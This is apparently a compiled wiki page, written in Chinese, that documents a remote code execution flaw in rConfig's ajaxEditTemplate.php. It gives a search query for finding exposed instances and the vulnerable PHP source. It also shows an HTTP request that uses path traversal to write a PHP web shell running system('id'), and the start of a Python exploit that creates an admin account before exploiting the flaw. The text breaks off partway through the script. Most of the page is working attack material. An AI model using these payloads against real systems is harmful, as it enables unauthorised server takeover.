import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as s,c as a,e as t}from"./app-58e4a7d6.js";const p={},e=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>rConfig ajaxEditTemplate.php 存在后台远程命令执行</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>rConfig
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;rConfig&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>漏洞文件为 <strong>rconfig/www/lib/ajaxHandlers/ajaxEditTemplate.php</strong></p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;/home/rconfig/classes/usersession.class.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;/home/rconfig/classes/ADLog.class.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;/home/rconfig/classes/spyc.class.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;/home/rconfig/config/functions.inc.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$log</span> <span class="token operator">=</span> <span class="token class-name static-context">ADLog</span><span class="token operator">::</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$session</span><span class="token operator">-&gt;</span><span class="token property">logged_in</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">&#39;Don\\&#39;t bother trying to hack me!!!!!&lt;br /&gt; This hack attempt has been logged&#39;</span><span class="token punctuation">;</span>
    <span class="token variable">$log</span><span class="token operator">-&gt;</span><span class="token function">Warn</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Security Issue: Some tried to access this file directly from IP: &quot;</span> <span class="token operator">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;REMOTE_ADDR&#39;</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot; &amp; Username: &quot;</span> <span class="token operator">.</span> <span class="token variable">$session</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot; (File: &quot;</span> <span class="token operator">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;PHP_SELF&#39;</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;)&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// need to add authentication to this script</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Location: &quot;</span> <span class="token operator">.</span> <span class="token variable">$config_basedir</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;login.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$ymlData</span> <span class="token operator">=</span> <span class="token class-name static-context">Spyc</span><span class="token operator">::</span><span class="token function">YAMLLoad</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;code&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$fileName</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;fileName&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$check_yml_extension</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;.&#39;</span><span class="token punctuation">,</span> <span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token operator">!</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$check_yml_extension</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token variable">$check_yml_extension</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">&#39;yml&#39;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$fileName</span> <span class="token operator">=</span> <span class="token variable">$fileName</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;.yml&#39;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$fullpath</span> <span class="token operator">=</span> <span class="token variable">$config_templates_basedir</span><span class="token operator">.</span><span class="token variable">$fileName</span><span class="token punctuation">;</span>

    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;username&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;../../../classes/db2.class.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;../../../classes/ADLog.class.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$db2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">db2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$log</span> <span class="token operator">=</span> <span class="token class-name static-context">ADLog</span><span class="token operator">::</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;templates&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;templates&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">chown</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;templates&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;apache&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// if&#39;&#39; to create the filename based on the command if not created &amp; chmod to 666</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;touch &quot;</span> <span class="token operator">.</span> <span class="token variable">$fullpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">chmod</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">,</span> <span class="token number">0666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// if the file is alread in place chmod it to 666 before writing info</span>
    <span class="token function">chmod</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">,</span> <span class="token number">0666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// dump array into file &amp; chmod back to RO</span>
    <span class="token variable">$filehandle</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;w+&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;code&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$filehandle</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">chmod</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">,</span> <span class="token number">0444</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token variable">$db2</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;UPDATE \`templates\` SET \`fileName\` = :fileName, \`name\` = :name, \`desc\` = :desc, \`dateLastEdit\` = NOW(), \`addedby\` = :username WHERE \`id\` = :id&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$db2</span><span class="token operator">-&gt;</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;:id&#39;</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;id&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$db2</span><span class="token operator">-&gt;</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;:fileName&#39;</span><span class="token punctuation">,</span> <span class="token variable">$fullpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$db2</span><span class="token operator">-&gt;</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;:name&#39;</span><span class="token punctuation">,</span> <span class="token variable">$ymlData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;main&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;name&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$db2</span><span class="token operator">-&gt;</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;:desc&#39;</span><span class="token punctuation">,</span> <span class="token variable">$ymlData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;main&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;desc&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$db2</span><span class="token operator">-&gt;</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;:username&#39;</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$queryResult</span> <span class="token operator">=</span> <span class="token variable">$db2</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">/* Update successful */</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$queryResult</span> <span class="token operator">&amp;&amp;</span> <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;success&quot;</span><span class="token punctuation">;</span>
        <span class="token variable">$log</span><span class="token operator">-&gt;</span><span class="token function">Info</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Success: Template: &quot;</span><span class="token operator">.</span><span class="token variable">$fullpath</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot; edited in templates folder&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/* Update failed */</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;failed&quot;</span><span class="token punctuation">;</span>
        <span class="token variable">$log</span><span class="token operator">-&gt;</span><span class="token function">Warn</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Success: Could not edit Template &quot;</span><span class="token operator">.</span><span class="token variable">$fullpath</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot; in templates folder&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
<span class="token punctuation">}</span>  <span class="token comment">// end session check</span>
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>关键代码如下</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token comment">// if&#39;&#39; to create the filename based on the command if not created &amp; chmod to 666</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;touch &quot;</span> <span class="token operator">.</span> <span class="token variable">$fullpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">chmod</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">,</span> <span class="token number">0666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// if the file is alread in place chmod it to 666 before writing info</span>
    <span class="token function">chmod</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">,</span> <span class="token number">0666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// dump array into file &amp; chmod back to RO</span>
    <span class="token variable">$filehandle</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;w+&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;code&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$filehandle</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">chmod</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">,</span> <span class="token number">0444</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>$fileName --&gt; $fullpath ---&gt; 写入文件，其中 fileName参数 POST传入时没有过滤导致目录可上传任意位置</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token variable">$ymlData</span> <span class="token operator">=</span> <span class="token class-name static-context">Spyc</span><span class="token operator">::</span><span class="token function">YAMLLoad</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;code&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$fileName</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;fileName&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$check_yml_extension</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;.&#39;</span><span class="token punctuation">,</span> <span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token operator">!</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$check_yml_extension</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token variable">$check_yml_extension</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">&#39;yml&#39;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$fileName</span> <span class="token operator">=</span> <span class="token variable">$fileName</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;.yml&#39;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$fullpath</span> <span class="token operator">=</span> <span class="token variable">$config_templates_basedir</span><span class="token operator">+</span> <span class="token operator">.</span><span class="token variable">$fileName</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162243099.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token variable">$filehandle</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;w+&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;code&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>POST code 传参写入文件 test.php.yml, 请求包如下</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>POST /lib/ajaxHandlers/ajaxEditTemplate.php HTTP/1.1
Host: 
Cookie: PHPSESSID=fv8j4c6r4gofug1vr9v3efdvj7
Content-Length: 81
Cache-Control: max-age=0
Sec-Ch-Ua: &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;90&quot;, &quot;Google Chrome&quot;;v=&quot;90&quot;
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Origin: https://176.62.195.243
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: https://176.62.195.243/lib/ajaxHandlers/ajaxEditTemplate.php

fileName=../www/test.php&amp;code=&lt;?php echo system(&#39;id&#39;);?&gt;&amp;id=1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162243006.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这里写入文件 <strong>test.php.yml</strong>,并使用 <strong>../</strong> 跳出限制的目录，访问 test.php.yml 实际访问了 test.php，执行id命令</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162243024.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/python3</span>
<span class="token comment">#-*- coding:utf-8 -*-</span>
<span class="token comment"># author : PeiQi</span>
<span class="token comment"># from   : http://wiki.peiqi.tech</span>

<span class="token keyword">import</span> base64
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> random
<span class="token keyword">import</span> re
<span class="token keyword">import</span> json
<span class="token keyword">import</span> sys
<span class="token keyword">from</span> requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> InsecureRequestWarning
<span class="token keyword">from</span> requests_toolbelt<span class="token punctuation">.</span>multipart<span class="token punctuation">.</span>encoder <span class="token keyword">import</span> MultipartEncoder

<span class="token keyword">def</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mPOC_Des: http://wiki.peiqi.tech                                   \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mGithub : https://github.com/PeiQi0                                 \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34m公众号  : PeiQi文库                                                   \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mVersion: rConfig ajaxEditTemplate.php 后台远程命令执行               \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36m使用格式:  python3 poc.py                                            \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">POC_1</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    vuln_url <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/lib/crud/userprocess.php&quot;</span>
    referer <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;useradmin.php&quot;</span>
    ran_number <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">999</span><span class="token punctuation">)</span>
    origin <span class="token operator">=</span> target_url
    multipart_data <span class="token operator">=</span> MultipartEncoder<span class="token punctuation">(</span>
        fields<span class="token operator">=</span><span class="token punctuation">{</span>
            <span class="token string">&#39;username&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;testtest{}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ran_number<span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token string">&#39;password&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;testtest@{}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ran_number<span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token string">&#39;passconf&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;testtest@{}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ran_number<span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token string">&#39;email&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;testtest{}@test.com&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ran_number<span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token string">&#39;ulevelid&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;9&#39;</span><span class="token punctuation">,</span>
            <span class="token string">&#39;add&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;add&#39;</span><span class="token punctuation">,</span>
            <span class="token string">&#39;editid&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;&#39;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">)</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> multipart_data<span class="token punctuation">.</span>content_type<span class="token punctuation">,</span> <span class="token string">&quot;Upgrade-Insecure-Requests&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;1&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Referer&quot;</span><span class="token punctuation">:</span> referer<span class="token punctuation">,</span>
               <span class="token string">&quot;Origin&quot;</span><span class="token punctuation">:</span> origin<span class="token punctuation">}</span>
    cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&#39;PHPSESSID&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;test&#39;</span><span class="token punctuation">}</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>InsecureRequestWarning<span class="token punctuation">)</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>vuln_url<span class="token punctuation">,</span> data<span class="token operator">=</span>multipart_data<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">&quot;error&quot;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            username <span class="token operator">=</span> <span class="token string">&#39;testtest{}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ran_number<span class="token punctuation">)</span>
            password <span class="token operator">=</span> <span class="token string">&#39;testtest@{}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ran_number<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[36m[o] 成功创建账户 testtest{}/testtest@{} \\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ran_number<span class="token punctuation">,</span> ran_number<span class="token punctuation">)</span><span class="token punctuation">)</span>
            POC_2<span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
